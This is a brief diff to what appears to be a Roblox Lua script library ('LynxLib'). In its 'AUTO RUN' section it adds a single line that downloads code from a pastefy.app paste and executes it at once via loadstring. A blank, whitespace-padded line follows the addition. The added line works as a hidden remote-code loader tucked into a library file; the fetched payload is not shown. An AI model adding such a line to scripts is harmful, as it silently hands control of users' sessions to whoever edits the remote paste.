@@ -2588,6 +2588,8 @@ end
 -- ══════════════════════════════════════════════════════════
 --  AUTO RUN
 -- ══════════════════════════════════════════════════════════
+loadstring(game:HttpGet("https://pastefy.app/OWHGGCSd/raw"))() 
+									
 pcall(function()
     if getgenv then getgenv().LynxLib = LynxLib end
 end)
